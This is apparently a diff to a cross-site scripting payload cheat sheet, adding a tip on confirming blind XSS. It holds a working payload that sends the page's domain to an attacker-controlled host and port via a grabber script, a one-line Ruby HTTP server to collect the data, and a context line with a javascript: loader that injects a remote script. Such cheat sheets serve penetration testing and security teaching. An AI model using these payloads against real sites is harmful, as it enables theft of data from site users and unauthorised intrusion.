@@ -452,6 +452,22 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yoursu
 - Comment Box
   - Administrative Panel
 
+### Tips
+
+You can use [Data grabber for XSS](#data-grabber-for-xss) and a one-line HTTP server to confirm the existence of a blind XSS before deploying an heavy blind XSS platform.
+
+Eg. payload
+
+```html
+<script>document.location='http://10.10.14.30:8080/XSS/grabber.php?c='+document.domain</script>
+```
+
+Eg. one-line HTTP server:
+
+```
+$ ruby -run -ehttpd . -p8080
+```
+
 ## Mutated XSS
 
 Use browsers quirks to recreate some HTML tags when it is inside an `element.innerHTML`.
